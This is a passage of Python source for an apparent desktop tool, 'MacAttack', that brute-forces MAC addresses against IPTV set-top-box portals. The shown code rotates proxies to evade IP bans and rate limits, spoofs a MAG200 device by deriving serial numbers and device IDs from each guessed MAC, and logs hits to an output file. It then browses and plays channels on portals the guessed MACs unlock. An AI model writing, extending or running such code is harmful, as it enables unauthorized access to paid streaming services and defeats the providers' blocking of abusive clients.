                                f"Error {self.proxy_error_counts[selected_proxy]} for Proxy: {selected_proxy} : <b>504 Gateway Time-out</b> Proxy timed out"
                            )
                            if self.remove_proxy(selected_proxy, self.proxy_error_counts):
                                break
                        else:
                            self.update_error_text_signal.emit(
                                f"Error: <b>504 Gateway Time-out</b>"
                            )
                    elif "504 DNS look up failed" in res.text:
                        # Track error count for the proxy
                        if selected_proxy not in self.proxy_error_counts:
                            self.proxy_error_counts[selected_proxy] = 1
                        else:
                            self.proxy_error_counts[selected_proxy] += 1
                        self.update_error_text_signal.emit(
                            f"Error {self.proxy_error_counts[selected_proxy]} for Proxy: {selected_proxy} : <b>504 DNS look up failed</b> DNS Issue with proxy"
                        )
                        if self.remove_proxy(selected_proxy, self.proxy_error_counts):
                            break
                    elif "502 Bad Gateway" in res.text:
                        # Track error count for the proxy
                        if selected_proxy not in self.proxy_error_counts:
                            self.proxy_error_counts[selected_proxy] = 1
                        else:
                            self.proxy_error_counts[selected_proxy] += 1
                        self.update_error_text_signal.emit(
                            f"Error {self.proxy_error_counts[selected_proxy]} for Proxy: {selected_proxy} : <b>502 Bad Gateway</b> Proxy communication issue"
                        )
                        if self.remove_proxy(selected_proxy, self.proxy_error_counts):
                            break
                    elif "miner.start" in res.text:
                        self.update_error_text_signal.emit(
                            f"Error for Proxy: {selected_proxy} : <b>Fake Proxy</b> part of a bitcoin botnet"
                        )
                        # remove immediately
                        if isinstance(proxies, list):
                            if selected_proxy in proxies:
                                proxies.remove(selected_proxy)
                        # Update the QTextEdit to remove the proxy
                        current_text = self.proxy_textbox.toPlainText()
                        new_text = "\n".join(
                            [
                                line
                                for line in current_text.splitlines()
                                if line.strip() != selected_proxy
                            ]
                        )
                        self.macattack_update_proxy_textbox_signal.emit(new_text)
                        self.update_error_text_signal.emit(
                            f"Proxy {selected_proxy} Fake proxy removed."
                        )
                    # even with cloudflare, a proxy can still get json results, removed this because every proxy spams
                    # elif "Cloudflare" in res.text:
                    #    self.update_error_text_signal.emit(f"Error for Portal: {selected_proxy} : <b>Cloudflare Blocked</b> blocked by Cloudflare")
                    elif "no such host" in res.text:
                        # Track error count for the proxy
                        if selected_proxy not in self.proxy_error_counts:
                            self.proxy_error_counts[selected_proxy] = 1
                        else:
                            self.proxy_error_counts[selected_proxy] += 1
                        self.update_error_text_signal.emit(
                            f"Error {self.proxy_error_counts[selected_proxy]} for Proxy: {selected_proxy} : <b>no such host</b> not connecting to portal"
                        )
                        if self.remove_proxy(selected_proxy, self.proxy_error_counts):
                            break
                    elif "Royalty - Staffing" in res.text:
                        # Track error count for the proxy
                        if selected_proxy not in self.proxy_error_counts:
                            self.proxy_error_counts[selected_proxy] = 1
                        else:
                            self.proxy_error_counts[selected_proxy] += 1
                        self.update_error_text_signal.emit(
                            f"Error {self.proxy_error_counts[selected_proxy]} for Proxy: {selected_proxy} : <b>Royalty - Staffing</b> WTF even is this?"
                        )
                        if self.remove_proxy(selected_proxy, self.proxy_error_counts):
                            break
                    elif "<title>æ" in res.text:
                        # Track error count for the proxy
                        if selected_proxy not in self.proxy_error_counts:
                            self.proxy_error_counts[selected_proxy] = 1
                        else:
                            self.proxy_error_counts[selected_proxy] += 1
                        self.update_error_text_signal.emit(
                            f"Error {self.proxy_error_counts[selected_proxy]} for Proxy: {selected_proxy} : <b>æ æ³æ¾ç¤ºæ­¤é¡µ</b> WTF even is this?"
                        )
                        if self.remove_proxy(selected_proxy, self.proxy_error_counts):
                            break
                    #elif "404 Not Found" in res.text:
                    #    # Track error count for the proxy
                    #    if selected_proxy not in self.proxy_error_counts:
                    #        self.proxy_error_counts[selected_proxy] = 1
                    #    else:
                    #        self.proxy_error_counts[selected_proxy] += 1
                    #    self.update_error_text_signal.emit(
                    #        f"Error {self.proxy_error_counts[selected_proxy]} for Proxy: {selected_proxy} : <b>404 Not Found</b> proxy cannot find portal."
                    #    )
                    #    if self.remove_proxy(selected_proxy, self.proxy_error_counts):
                    #        break
                    elif "ERROR: Not Found" in res.text:
                        # Track error count for the proxy
                        if selected_proxy not in self.proxy_error_counts:
                            self.proxy_error_counts[selected_proxy] = 1
                        else:
                            self.proxy_error_counts[selected_proxy] += 1
                        self.update_error_text_signal.emit(
                            f"Error {self.proxy_error_counts[selected_proxy]} for Proxy: {selected_proxy} : <b>Not connecting</b> Proxy not connecting to server."
                        )
                        # Attempt to remove the proxy if it exceeds the allowed error count
                        if self.remove_proxy(selected_proxy, self.proxy_error_counts):
                            break
                    elif "banned your IP" in res.text or "403: Forbidden" in res.text:
                        if ratelimit_timeout > 0: 
                            self.update_error_text_signal.emit(
                                f"Error for Portal: <b>Banned</b> {selected_proxy}"
                            )
                            if self.temp_remove_proxy(selected_proxy):  # Temp remove the proxy
                                time.sleep(self.remove_for_seconds_spinbox.value()) #sleep the thread if alt speed enabled
                    #elif "403 Forbidden" in res.text or "403: Forbidden" in res.text:
                    #    if ratelimit_timeout > 0: 
                    #        self.update_error_text_signal.emit(
                    #            f"Error for Portal: <b>403 Forbidden</b> {selected_proxy} <b>Blacklisted</b> or <b>ratelimited</b>"
                    #        )
                    #        if self.temp_remove_proxy(selected_proxy):  # Temp remove the proxy
                    #            time.sleep(self.remove_for_seconds_spinbox.value()) # Sleep the thread if alt speed enabled
                    elif "Connection to server failed" in res.text:
                        # Track error count for the proxy
                        if selected_proxy not in self.proxy_error_counts:
                            self.proxy_error_counts[selected_proxy] = 1
                        else:
                            self.proxy_error_counts[selected_proxy] += 1
                        self.update_error_text_signal.emit(
                            f"Error {self.proxy_error_counts[selected_proxy]} for Proxy: {selected_proxy} : <b>Not connecting</b> Proxy not connecting to server"
                        )
                        # Attempt to remove the proxy if it exceeds the allowed error count
                        if self.remove_proxy(selected_proxy, self.proxy_error_counts):
                            break
                    elif "Max retries exceeded" in res.text:
                        # Track error count for the proxy
                        if selected_proxy not in self.proxy_error_counts:
                            self.proxy_error_counts[selected_proxy] = 1
                        else:
                            self.proxy_error_counts[selected_proxy] += 1
                        self.update_error_text_signal.emit(
                            f"Error {self.proxy_error_counts[selected_proxy]} for Proxy: {selected_proxy} : <b>Not connecting</b> Proxy offline"
                        )
                        # Attempt to remove the proxy if it exceeds the allowed error count
                        if self.remove_proxy(selected_proxy, self.proxy_error_counts):
                            break

                    elif mac in res.text:
                        # good result, reset errors
                        self.proxy_error_counts[selected_proxy] = 0
                        self.proxy_error_connect_counts[selected_proxy] = 0
                        logging.debug(f"Raw Response Content:\n{mac}\n%s", res.text)
                    elif re.search(
                        r"<html><head><title>.*</title></head><body></body></html>",
                        res.text,
                    ):
                        # Track error count for the proxy
                        if selected_proxy not in self.proxy_error_counts:
                            self.proxy_error_counts[selected_proxy] = 1
                        else:
                            self.proxy_error_counts[selected_proxy] += 1
                        self.update_error_text_signal.emit(
                            f"Error {self.proxy_error_counts[selected_proxy]} for Proxy: {selected_proxy} : <b>Proxy Server issue</b> Empty response"
                        )
                        if self.remove_proxy(selected_proxy, self.proxy_error_counts):
                            break
                    else:
                        # Remove errorcounts
                        if selected_proxy in self.proxy_error_counts:
                            del self.proxy_error_counts[selected_proxy]
                        if selected_proxy in self.proxy_error_connect_counts:
                            del self.proxy_error_connect_counts[selected_proxy]
                        logging.debug(f"Raw Response Content:\n{mac}\n{res.text}")
                    # self.error_count += 1
                # elif "Failed to parse" in str(e):
                #    self.update_error_text_signal.emit("ERROR: error parsing the url")
                elif "target machine actively refused it" in str(e):
                    if ratelimit_timeout > 0:                     
                        # Track connection error counts
                        if selected_proxy not in self.proxy_error_connect_counts:
                            self.proxy_error_connect_counts[selected_proxy] = 1
                        else:
                            self.proxy_error_connect_counts[selected_proxy] += 1
                        if (
                            self.proxy_error_connect_counts[selected_proxy] > 60
                        ):  # Track error count for the proxy every # consecutive connection errors.
                            self.update_error_text_signal.emit(
                                f"Error for portal: <b>The target machine refused connection</b> {selected_proxy}"
                            )
                            if self.temp_remove_proxy(selected_proxy):  # Temp remove the proxy
                                time.sleep(self.remove_for_seconds_spinbox.value()) # Sleep the thread if alt speed enabled
                            del self.proxy_error_connect_counts[selected_proxy]

                elif "Read timed out" in str(e):
                    logging.debug(f"{selected_proxy} did not respond")
                    if not Ludicrous_speed and ratelimit_timeout > 0:       
                        # Track connection error counts
                        if selected_proxy not in self.proxy_error_connect_counts:
                            self.proxy_error_connect_counts[selected_proxy] = 1
                        else:
                            self.proxy_error_connect_counts[selected_proxy] += 1
                        if (
                            self.proxy_error_connect_counts[selected_proxy] > 60
                        ):  # Track error count for the proxy every # consecutive connection errors.

                            # Track error count for the proxy
                            if selected_proxy not in self.proxy_error_counts:
                                self.proxy_error_counts[selected_proxy] = 1
                            else:
                                self.proxy_error_counts[selected_proxy] += 1
                            self.update_error_text_signal.emit(
                                f"Error {self.proxy_error_counts[selected_proxy]} for Proxy: <b>Read timed out</b> {selected_proxy}"
                            )
                            if self.remove_proxy(selected_proxy, self.proxy_error_counts):
                                break
                            #self.temp_remove_proxy(selected_proxy)  # Temp remove the proxy
                            del self.proxy_error_connect_counts[selected_proxy]

                elif "Unable to connect to proxy" in str(e):
                    logging.debug(f"Unable to connect to {selected_proxy}")
                    if not Ludicrous_speed and ratelimit_timeout > 0:       
                        # Could be bad internet, the proxy ratelimiting, or the proxy not connecting
                        # Track connection error counts
                        if selected_proxy not in self.proxy_error_connect_counts:
                            self.proxy_error_connect_counts[selected_proxy] = 1
                        else:
                            self.proxy_error_connect_counts[selected_proxy] += 1
                        if (
                            self.proxy_error_connect_counts[selected_proxy] > 60
                        ):  # Track error count for the proxy every # consecutive connection errors.

                            # Track error count for the proxy
                            if selected_proxy not in self.proxy_error_counts:
                                self.proxy_error_counts[selected_proxy] = 1
                            else:
                                self.proxy_error_counts[selected_proxy] += 1
                            self.update_error_text_signal.emit(
                                f"Error {self.proxy_error_counts[selected_proxy]} for Proxy: <b>Proxy Timing out</b> {selected_proxy}"
                            )
                            if self.remove_proxy(selected_proxy, self.proxy_error_counts):
                                break

                            #self.temp_remove_proxy(selected_proxy)  # Temp remove the proxy
                            del self.proxy_error_connect_counts[selected_proxy]

                else:  # Remove errorcounts
                    if selected_proxy in self.proxy_error_counts:
                        del self.proxy_error_counts[selected_proxy]
                    if selected_proxy in self.proxy_error_connect_counts:
                        del self.proxy_error_connect_counts[selected_proxy]

    def remove_proxy(self, proxy, proxy_error_counts):
        if self.proxy_enabled_checkbox.isChecked():
            """Remove a proxy after exceeding error count and update UI."""
            error_limit = self.proxy_remove_errorcount.value()
            if error_limit > 0 and self.proxy_error_counts.get(proxy, 0) >= error_limit:
                # Remove proxy from the list
                current_text = self.proxy_textbox.toPlainText()
                new_text = "\n".join(
                    line for line in current_text.splitlines() if line.strip() != proxy
                )
                self.macattack_update_proxy_textbox_signal.emit(new_text)
                # Remove proxy from dictionary
                self.proxy_error_counts.pop(proxy, None)
                # Notify user
                self.update_error_text_signal.emit(
                    f"Proxy {proxy} removed after exceeding {error_limit} consecutive errors."
                )
                if self.proxy_altspeed_checkbox.isChecked():
                    return True # Allow the break command to execute
                else:
                    return False

    def temp_remove_proxy(self, proxy):
        """Temporarily remove a proxy for ratelimit_timeout seconds, then re-it."""
        ratelimit_timeout = self.remove_for_seconds_spinbox.value()
        if ratelimit_timeout > 0:
            # Get the current text in the proxy_textbox
            current_text = self.proxy_textbox.toPlainText()
            # Check if the proxy exists before attempting to remove it
            if proxy in current_text.splitlines():
                if not self.proxy_altspeed_checkbox.isChecked():
                    # Remove proxy from the list temporarily
                    new_text = "\n".join(
                        line for line in current_text.splitlines() if line.strip() != proxy
                    )
                    self.macattack_update_proxy_textbox_signal.emit(new_text)
                # Notify user of temporary removal
                self.update_error_text_signal.emit(
                    f"Proxy {proxy} temporarily removed."
                )
                if self.proxy_altspeed_checkbox.isChecked():
                    return True # Allow the sleep command to execute

                # Define a function to re-the proxy after 10 seconds
                def re_add_proxy():
                    # Get the updated state of proxy_textbox
                    updated_text = self.proxy_textbox.toPlainText()
                    # Check if the proxy already exists in the updated text
                    if proxy not in updated_text.splitlines():
                        # Append the proxy to the end
                        new_text = f"{updated_text}\n{proxy}".strip()
                        self.macattack_update_proxy_textbox_signal.emit(new_text)
                        # Notify user of re-addition
                        self.update_error_text_signal.emit(
                            f"Proxy {proxy} re-added after {ratelimit_timeout} seconds."
                        )
                    # else:
                    # Notify user that the proxy already exists
                    # self.update_error_text_signal.emit(f"Proxy {proxy} already exists, not re-added.")

                # Start a thread to handle the delayed re-addition
                threading.Timer(ratelimit_timeout, re_add_proxy).start()
        else:
            return False                

    def play_success_sound(self):
        # Determine the base path for the sound file
        if getattr(
            sys, "frozen", False
        ):  # Check if the app is frozen (i.e., packaged with PyInstaller)
            base_path = sys._MEIPASS
        else:
            base_path = os.path.abspath(".")
        # Construct the path to the sound file
        sound_path = os.path.join(base_path, "include", "success.mp3")
        try:
            # Create VLC media player instance and play the sound
            soundplayer = vlc.MediaPlayer(sound_path)
            soundplayer.play()
            duration = (
                soundplayer.get_length() / 1000
            )  # Convert milliseconds to seconds
            if duration > 0:  # Only wait if duration is properly determined
                time.sleep(duration)
        except Exception as e:
            logging.debug(f"Error playing sound with VLC: {e}")

    def OutputMastermind(self):
        if self.singleoutputfile_checkbox.isChecked():
            filename = "MacAttackOutput.txt"
            return filename
        else:
            # Fancy file-naming because why not complicate things?
            current_time = datetime.now().strftime("%m%d%H%M%S")
            sanitized_url = (
                self.base_url.replace("http://", "")
                .replace("https://", "")
                .replace("/", "-")
                .replace(":", ".")
            )
            filename = f"{sanitized_url}{current_time}.txt"
            return filename

    def GiveUp(self):
        global portaltype
        self.running = False
        if self.proxy_enabled_checkbox.isChecked():
            self.update_error_text_signal.emit(
                "\n░██████╗████████╗░█████╗░██████╗░██████╗░██╗███╗░░██╗░██████╗░██╗\n"
                "██╔════╝╚══██╔══╝██╔══██╗██╔══██╗██╔══██╗██║████╗░██║██╔════╝░██║\n"
                "╚█████╗░░░░██║░░░██║░░██║██████╔╝██████╔╝██║██╔██╗██║██║░░██╗░██║\n"
                "░╚═══██╗░░░██║░░░██║░░██║██╔═══╝░██╔═══╝░██║██║╚████║██║░░╚██╗╚═╝\n"
                "██████╔╝░░░██║░░░╚█████╔╝██║░░░░░██║░░░░░██║██║░╚███║╚██████╔╝██╗\n"
                "╚═════╝░░░░╚═╝░░░░╚════╝░╚═╝░░░░░╚═╝░░░░░╚═╝╚═╝░░╚══╝░╚═════╝░╚═╝\n"
                "Please wait for background tasks to complete.\n Results may still appear in the next few minutes.\n"
            )

        self.killthreads()
        QTimer.singleShot(
            15000,
            lambda: (
                self.start_button.setDisabled(False)
                if not self.stop_button.isEnabled()
                else None
            ),
        )  # enable start_button if stop_button is disabled

        # Disable further user input immediately
        logging.info("GiveUp initiated: Preparing to stop threads.")

        # Disable buttons while stopping threads
        self.stop_button.setDisabled(True)

        # Delay for updating the brute_mac_label
        if self.proxy_enabled_checkbox.isChecked():
            if (
                self.nomacs == 0
            ):  # Dont show if it was stopped because no mac addresses in custom list
                QTimer.singleShot(
                    3500,
                    lambda: self.brute_mac_label.setText(
                        "Please Wait...\nThere are proxies in the background finishing their tasks."
                    ),
                )
                self.nomacs = 1
        # Start a thread to handle thread cleanup
        cleanup_thread = threading.Thread(target=self._wait_for_threads)
        cleanup_thread.start()

    def _wait_for_threads(self):
        if self.cleaningup == 0:  # One cleanup at a time
            self.cleaningup = 1
            logging.debug("Waiting for threads to finish...")
            # Wait for all threads to complete
            if hasattr(self, "threads"):
                for thread in self.threads:
                    if thread.is_alive():
                        thread.join()  # Wait for the thread to complete
            # Once all threads are done, reset the GUI on the main thread
            QTimer.singleShot(0, self._reset_gui_after_cleanup)
            self.update_error_text_signal.emit(
                "███████╗██╗███╗░░██╗██╗░██████╗██╗░░██╗███████╗██████╗░██╗\n"
                "██╔════╝██║████╗░██║██║██╔════╝██║░░██║██╔════╝██╔══██╗██║\n"
                "█████╗░░██║██╔██╗██║██║╚█████╗░███████║█████╗░░██║░░██║██║\n"
                "██╔══╝░░██║██║╚████║██║░╚═══██╗██╔══██║██╔══╝░░██║░░██║╚═╝\n"
                "██║░░░░░██║██║░╚███║██║██████╔╝██║░░██║███████╗██████╔╝██╗\n"
                "╚═╝░░░░░╚═╝╚═╝░░╚══╝╚═╝╚═════╝░╚═╝░░╚═╝╚══════╝╚═════╝░╚═╝\n"
                "All Tasks have completed."
            )
            self.cleaningup = 0

    def _reset_gui_after_cleanup(self):
        # Safely reset GUI elements on the main thread
        logging.debug("All threads stopped. Resetting GUI.")
        self.threads = []  # Clear the thread list
        self.start_button.setDisabled(False)
        self.stop_button.setDisabled(True)
        self.brute_mac_label.setText("")
        # Close the output file if it was open
        if hasattr(self, "output_file") and self.output_file:
            try:
                self.output_file.close()
                logging.debug("Output file closed successfully.")
            except Exception as e:
                logging.error(f"Error closing output file: {str(e)}")
            finally:
                self.output_file = None

    def set_progress(self, value):
        # Animate the progress bar to the new value
        if self.progress_animation.state() == QPropertyAnimation.Running:
            self.progress_animation.stop()
        start_val = self.progress_bar.value()
        self.progress_animation.setStartValue(start_val)
        self.progress_animation.setEndValue(value)
        self.progress_animation.start()
        logging.debug(f"Animating progress bar from {start_val} to {value}.")

    def on_initial_playlist_received(self, data):
        if self.current_request_thread != self.sender():
            logging.debug("Received data from an old thread. Ignoring.")
            return  # Ignore signals from older threads

        if not data:
            self.error_label.setText("ERROR: Unable to connect to the host")
            self.error_label.setVisible(True)
            self.set_progress(0)

            logging.error("Playlist data is empty.")
            self.current_request_thread = None
            return
        for tab_name, tab_data in data.items():
            tab_info = self.tab_data.get(tab_name)
            if not tab_info:
                logging.warning(f"Unknown tab name: {tab_name}")
                continue
            tab_info["playlist_data"] = tab_data
            tab_info["current_category"] = None
            tab_info["navigation_stack"] = []
            self.update_playlist_view(tab_name)
        logging.debug("Playlist data loaded into tabs.")
        self.current_request_thread = None  # Reset the current thread

    def update_playlist_view(self, tab_name, scroll_position=0):
        tab_info = self.tab_data[tab_name]
        playlist_model = tab_info["playlist_model"]
        playlist_view = tab_info["playlist_view"]

        playlist_model.clear()
        tab_info["current_view"] = "categories"

        if tab_info["navigation_stack"]:
            go_back_item = QStandardItem("Go Back")
            playlist_model.appendRow(go_back_item)

        if tab_info["current_category"] is None:
            for item in tab_info["playlist_data"]:
                name = item["name"]
                list_item = QStandardItem(name)
                list_item.setData(item, Qt.UserRole)
                list_item.setData("category", Qt.UserRole + 1)
                playlist_model.appendRow(list_item)
            # Restore scroll position after model is populated
            QTimer.singleShot(
                0, lambda: playlist_view.verticalScrollBar().setValue(scroll_position)
            )
        else:
            self.retrieve_channels(tab_name, tab_info["current_category"])

    def on_channels_loaded(self, tab_name, channels):
        if self.current_request_thread != self.sender():
            logging.debug("Received channels from an old thread. Ignoring.")
            return  # Ignore signals from older threads

        tab_info = self.tab_data[tab_name]
        tab_info["current_channels"] = channels
        self.update_channel_view(tab_name)
        logging.debug(f"Channels loaded for tab {tab_name}: {len(channels)} items.")
        self.current_request_thread = None  # Reset the current thread

    def update_channel_view(self, tab_name, scroll_position=0):
        tab_info = self.tab_data[tab_name]
        playlist_model = tab_info["playlist_model"]
        playlist_view = tab_info["playlist_view"]

        playlist_model.clear()
        tab_info["current_view"] = "channels"

        if tab_info["navigation_stack"]:
            go_back_item = QStandardItem("Go Back")
            playlist_model.appendRow(go_back_item)

        for channel in tab_info["current_channels"]:
            channel_name = channel["name"]
            list_item = QStandardItem(channel_name)
            list_item.setData(channel, Qt.UserRole)
            item_type = channel.get("item_type", "channel")
            list_item.setData(item_type, Qt.UserRole + 1)
            playlist_model.appendRow(list_item)

        # Restore scroll position after model is populated
        QTimer.singleShot(
            0, lambda: playlist_view.verticalScrollBar().setValue(scroll_position)
        )

    def on_playlist_selection_changed(self, index):
        sender = self.sender()
        current_tab = None
        for tab_name, tab_info in self.tab_data.items():
            if sender == tab_info["playlist_view"]:
                current_tab = tab_name
                break
        else:
            logging.error("Unknown sender for on_playlist_selection_changed")
            return

        tab_info = self.tab_data[current_tab]
        playlist_model = tab_info["playlist_model"]
        playlist_view = tab_info["playlist_view"]

        if index.isValid():
            item = playlist_model.itemFromIndex(index)
            item_text = item.text()

            if item_text == "Go Back":
                # Handle 'Go Back' functionality
                if tab_info["navigation_stack"]:
                    nav_state = tab_info["navigation_stack"].pop()
                    tab_info["current_category"] = nav_state["category"]
                    tab_info["current_view"] = nav_state["view"]
                    tab_info["current_series_info"] = nav_state[
                        "series_info"
                    ]  # Restore series_info
                    scroll_position = nav_state.get("scroll_position", 0)
                    logging.debug(f"Go Back to view: {tab_info['current_view']}")
                    if tab_info["current_view"] == "categories":
                        self.update_playlist_view(current_tab, scroll_position)
                    elif tab_info["current_view"] == "channels":
                        self.update_channel_view(current_tab, scroll_position)
                    elif tab_info["current_view"] in ["seasons", "episodes"]:
                        self.update_series_view(current_tab, scroll_position)
                else:
                    logging.debug("Navigation stack is empty. Cannot go back.")
                    QMessageBox.information(
                        self, "Info", "No previous view to go back to."
                    )
            else:
                item_data = item.data(Qt.UserRole)
                item_type = item.data(Qt.UserRole + 1)
                logging.debug(f"Item data: {item_data}, item type: {item_type}")

                # Store current scroll position before navigating
                current_scroll_position = playlist_view.verticalScrollBar().value()

                if item_type == "category":
                    logging.debug("category")
                    # Navigate into a category
                    tab_info["navigation_stack"].append(
                        {
                            "category": tab_info["current_category"],
                            "view": tab_info["current_view"],
                            "series_info": tab_info[
                                "current_series_info"
                            ],  # Preserve current_series_info
                            "scroll_position": current_scroll_position,
                        }
                    )
                    tab_info["current_category"] = item_data
                    logging.debug(f"Navigating to category: {item_data.get('name')}")
                    self.retrieve_channels(current_tab, tab_info["current_category"])

                elif item_type == "series":
                    # User selected a series, retrieve its seasons
                    tab_info["navigation_stack"].append(
                        {
                            "category": tab_info["current_category"],
                            "view": tab_info["current_view"],
                            "series_info": tab_info[
                                "current_series_info"
                            ],  # Preserve current_series_info
                            "scroll_position": current_scroll_position,
                        }
                    )
                    tab_info["current_category"] = item_data
                    logging.debug(f"Navigating to series: {item_data.get('name')}")
                    self.retrieve_series_info(current_tab, item_data)

                elif item_type == "season":
                    # User selected a season, set navigation context
                    tab_info["navigation_stack"].append(
                        {
                            "category": tab_info["current_category"],
                            "view": tab_info["current_view"],
                            "series_info": tab_info[
                                "current_series_info"
                            ],  # Preserve current_series_info
                            "scroll_position": current_scroll_position,
                        }
                    )
                    tab_info["current_category"] = item_data

                    # Update view to 'seasons'
                    tab_info["current_view"] = "seasons"
                    self.update_series_view(current_tab)

                    # Retrieve episodes using the season data
                    logging.debug(
                        f"Fetching episodes for season {item_data['season_number']} in series {item_data['name']}"
                    )
                    self.retrieve_series_info(
                        current_tab,
                        item_data,
                        season_number=item_data["season_number"],
                    )

                elif item_type == "episode":
                    # User selected an episode, play it
                    logging.debug(f"Playing episode: {item_data.get('name')}")
                    self.play_channel(item_data)

                elif item_type in ["channel", "vod"]:
                    # This is an IPTV channel or VOD, play it
                    logging.debug(f"Playing channel/VOD: {item_data.get('name')}")
                    self.play_channel(item_data)

                else:
                    logging.error("Unknown item type")

    def retrieve_series_info(self, tab_name, context_data, season_number=None):
        tab_info = self.tab_data[tab_name]
        try:
            session = self.session
            url = self.base_url
            mac = self.mac

            # Check if token is still valid
            if not self.is_token_valid():
                self.token, self.token_random = get_token(session, url, mac)
                self.token_timestamp = time.time()
                if not self.token:
                    QMessageBox.critical(
                        self,
                        "Error",
                        "Failed to retrieve token. Please check your MAC address and URL.",
                    )
                    return

            token = self.token

            serialnumber = hashlib.md5(mac.encode()).hexdigest().upper()
            sn = serialnumber[0:13]
            device_id = hashlib.sha256(sn.encode()).hexdigest().upper()
            device_id2 = hashlib.sha256(mac.encode()).hexdigest().upper()
            hw_version_2 = hashlib.sha1(mac.encode()).hexdigest()
            cookies = {
                "adid": hw_version_2,
                "debug": "1",
                "device_id2": device_id2,
                "device_id": device_id,
                "hw_version": "1.7-BD-00",
                "mac": mac,
                "sn": sn,
                "stb_lang": "en",
                "timezone": "America/Los_Angeles",
                "token": token,
            }

            headers = {
                "User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) "
                "AppleWebKit/533.3 (KHTML, like Gecko) "
                "MAG200 stbapp ver: 2 rev: 250 Safari/533.3",
                "Authorization": f"Bearer {token}",
                "Connection": "keep-alive",
            }

            if self.token_random:
                session.headers.update(
                    {
                        "User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3",
                        "Accept-Encoding": "identity",
                        "Accept": "*/*",
                        "Connection": "keep-alive",
                        "Authorization": f"Bearer {token}",
                        "X-Random": f"{token_random}",
                    }
                )

                session.cookies.update(
                    {
                        "adid": hw_version_2,
                        "debug": "1",
                        "device_id2": device_id2,
                        "device_id": device_id,
                        "hw_version": "1.7-BD-00",
                        "mac": mac,
                        "sn": sn,
                        "stb_lang": "en",
                        "timezone": "America/Los_Angeles",
                    }
                )

            series_id = context_data.get("id")
            if not series_id:
                logging.error(f"Series ID missing in context data: {context_data}")
                return

            if season_number is None:
                # Fetch seasons
                all_seasons = []
                page_number = 0
                while True:
                    seasons_url = f"{url}{portaltype}?type=series&action=get_ordered_list&movie_id={series_id}&season_id=0&episode_id=0&JsHttpRequest=1-xml&p={page_number}"
                    logging.debug(
                        f"Fetching seasons URL: {seasons_url}, headers: {headers}, cookies: {cookies}"
                    )
                    response = session.get(
                        seasons_url, cookies=cookies, headers=headers, timeout=10
                    )
                    logging.debug(f"Seasons response: {response.text}")
                    if response.status_code == 200:
                        seasons_data = response.json().get("js", {}).get("data", [])
                        if not seasons_data:
                            break
                        for season in seasons_data:
                            season_id = season.get("id", "")
                            season_number_extracted = None
                            if season_id.startswith("season"):
                                match = re.match(r"season(\d+)", season_id)
                                if match:
                                    season_number_extracted = int(match.group(1))
                                else:
                                    logging.error(
                                        f"Unexpected season id format: {season_id}"
                                    )
                            else:
                                match = re.match(r"\d+:(\d+)", season_id)
                                if match:
                                    season_number_extracted = int(match.group(1))
                                else:
                                    logging.error(
                                        f"Unexpected season id format: {season_id}"
                                    )

                            season["season_number"] = season_number_extracted
                            season["item_type"] = "season"
                        all_seasons.extend(seasons_data)
                        total_items = (
                            response.json()
                            .get("js", {})
                            .get("total_items", len(all_seasons))
                        )
                        logging.debug(
                            f"Fetched {len(all_seasons)} seasons out of {total_items}."
                        )
                        if len(all_seasons) >= total_items:
                            break
                        page_number += 1
                    else:
                        logging.error(
                            f"Failed to fetch seasons for page {page_number} with status code {response.status_code}"
                        )
                        break

                if all_seasons:
                    # Sort seasons by season_number
                    all_seasons.sort(key=lambda x: x.get("season_number", 0))
                    tab_info["current_series_info"] = all_seasons
                    tab_info["current_view"] = "seasons"
                    self.update_series_view(tab_name)
            else:
                # Fetch episodes for the given season
                series_list = context_data.get("series", [])
                if not series_list:
                    logging.info("No episodes found in this season.")
                    return

                logging.debug(f"Series episodes found: {series_list}")
                all_episodes = []
                for episode_number in series_list:
                    episode = {
                        "id": f"{series_id}:{episode_number}",
                        "series_id": series_id,
                        "season_number": season_number,
                        "episode_number": episode_number,
                        "name": f"Episode {episode_number}",
                        "item_type": "episode",
                        "cmd": context_data.get("cmd"),
                    }
                    logging.debug(f"Episode details: {episode}")
                    all_episodes.append(episode)

                if all_episodes:
                    # Sort episodes by episode_number
                    all_episodes.sort(key=lambda x: x.get("episode_number", 0))
                    tab_info["current_series_info"] = all_episodes
                    tab_info["current_view"] = "episodes"
                    self.update_series_view(tab_name)
                else:
                    logging.info("No episodes found.")
        except KeyError as e:
            logging.error(f"KeyError retrieving series info: {str(e)}")
        except Exception as e:
            logging.error(f"Error retrieving series info: {str(e)}")

    def is_token_valid(self):
        # Assuming token is valid for 10 minutes
        # if self.token and (time.time() - self.token_timestamp) < 600:
        # Assuming token is valid for 10 seconds
        if self.token and (time.time() - self.token_timestamp) < 10:
            return True
        return False

    def retrieve_channels(self, tab_name, category):
        category_type = category["category_type"]
        category_id = category.get("category_id") or category.get("genre_id")
        num_threads = 5
        logging.debug(
            f"retrieve channels started type: {category_type} id: {category_id}"
        )
        try:
            # Instead of setting progress directly, emit 0
            self.set_progress(0)
            if (
                self.current_request_thread is not None
                and self.current_request_thread.isRunning()
            ):
                QMessageBox.warning(
                    self,
                    "Warning",
                    "A channel request is already in progress. Please wait.",
                )
                logging.warning(
                    "User attempted to start a new channel request while one is already running."
                )
                return  # Prevent starting multiple channel requests

            # Check if token is still valid
            if not self.is_token_valid():
                self.token, self.token_random = get_token(
                    self.session, self.base_url, self.mac
                )
                self.token_timestamp = time.time()
                if not self.token:
                    QMessageBox.critical(
                        self,
                        "Error",
                        "Failed to retrieve token. Please check your MAC address and URL.",
                    )
                    return

            self.request_thread = RequestThread(
                self.base_url,
                self.mac,
                self.session,
                self.token,
                self.token_random,
                category_type,
                category_id,
                num_threads=num_threads,
            )
            self.request_thread.update_progress.connect(self.set_progress)
            self.request_thread.channels_loaded.connect(
                lambda channels: self.on_channels_loaded(tab_name, channels)
            )
            self.request_thread.start()
            self.current_request_thread = self.request_thread
            logging.debug(
                f"Started RequestThread for channels in category {category_id}."
            )
        except Exception as e:
            traceback.print_exc()
            self.show_error_message("An error occurred while retrieving channels.")
            logging.error(f"Exception in retrieve_channels: {e}")

    def play_channel(self, channel):
        cmd = channel.get("cmd")
        if not cmd:
            logging.error(f"No command found for channel: {channel}")
            return
        if cmd.startswith("ffmpeg "):
            cmd = cmd[len("ffmpeg ") :]

        item_type = channel.get("item_type", "channel")

        if item_type == "channel":
            needs_create_link = False
            if "/ch/" in cmd and cmd.endswith("_") or "ffrt" in cmd:
                needs_create_link = True

            if needs_create_link:
                try:
                    session = self.session
